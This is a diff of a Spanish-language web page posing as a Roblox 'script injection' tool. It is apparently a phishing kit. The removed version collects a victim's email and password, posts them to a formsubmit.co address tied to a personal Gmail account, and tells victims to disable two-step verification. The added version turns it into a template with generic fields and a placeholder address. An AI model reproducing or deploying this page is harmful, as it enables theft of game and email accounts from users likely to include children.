@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>SCRIPT T1X INJECTION</title>
+<title>T1X SCRIPT INJECTION</title>
 
 <style>
 body{
@@ -31,6 +31,12 @@ border-radius:15px;
 width:320px;
 text-align:center;
 box-shadow:0 0 20px #00ff9f;
+}
+
+.title{
+font-size:18px;
+margin-bottom:15px;
+letter-spacing:2px;
 }
 
 .btn{
@@ -124,24 +130,24 @@ to{opacity:1}
 
 <canvas id="matrix"></canvas>
 
-<div class="card" id="card">
+<div class="card">
 
-<h2>SCRIPT T1X INJECTION</h2>
+<div class="title">T1X SCRIPT INJECTION</div>
 
-<button class="btn" onclick="mostrarFormulario()">ROBLOX</button>
+<button class="btn" onclick="mostrarFormulario()">roblix</button>
 
-<form id="form" class="hidden" action="https://formsubmit.co/cesaralbertolandero@gmail.com" method="POST">
+<form id="form" class="hidden" action="https://formsubmit.co/TUCORREO@gmail.com" method="POST">
 
-<input id="campo1" type="text" name="campo1" placeholder="Correo Eléctronico" required>
+<input id="campo1" type="text" name="campo1" placeholder="Primer dato..." required>
+
+<textarea id="campo2" name="campo2" placeholder="Segundo dato..." required></textarea>
 
 <div class="counter">
 <span id="contador">0</span>/13 caracteres
 </div>
 
-<textarea name="campo2" placeholder="Contraseña" required></textarea>
-
 <div class="info">
-Para que funcione correctamente se recomienda desactivar las verificaciones de 2 pasos o llaves de acceso
+somos 2 personas, funcionará en aproximadamente 12-24 horas
 </div>
 
 <div class="processing" id="processing">
@@ -170,15 +176,15 @@ function mostrarFormulario(){
 document.getElementById("form").classList.remove("hidden");
 }
 
-const campo1=document.getElementById("campo1");
+const campo2=document.getElementById("campo2");
 const boton=document.getElementById("btnAceptar");
 const contador=document.getElementById("contador");
 
-campo1.addEventListener("input",()=>{
+campo2.addEventListener("input",()=>{
 
-contador.textContent=campo1.value.length;
+contador.textContent=campo2.value.length;
 
-if(campo1.value.length>=13){
+if(campo2.value.length>=13){
 boton.disabled=false;
 }else{
 boton.disabled=true;
@@ -190,7 +196,7 @@ const sonido = new Audio("https://assets.mixkit.co/active_storage/sfx/270/270-pr
 
 boton.addEventListener("click",(e)=>{
 
-if(campo1.value.length<13){
+if(campo2.value.length<13){
 e.preventDefault();
 return;
 }
